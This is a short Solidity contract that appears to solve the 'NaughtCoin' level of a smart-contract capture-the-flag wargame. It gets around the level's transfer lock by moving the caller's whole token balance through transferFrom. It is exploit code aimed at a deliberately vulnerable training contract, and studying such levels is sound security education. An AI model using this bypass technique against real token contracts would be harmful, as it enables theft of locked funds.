pragma solidity ^0.6.0;

import "./level.sol";

contract Solution {
    NaughtCoin level;

    constructor(address _levelInstance) public {
        level = NaughtCoin(_levelInstance);
    }

    function solve() public {
        level.transferFrom(msg.sender, address(this), level.balanceOf(msg.sender));
    }
}
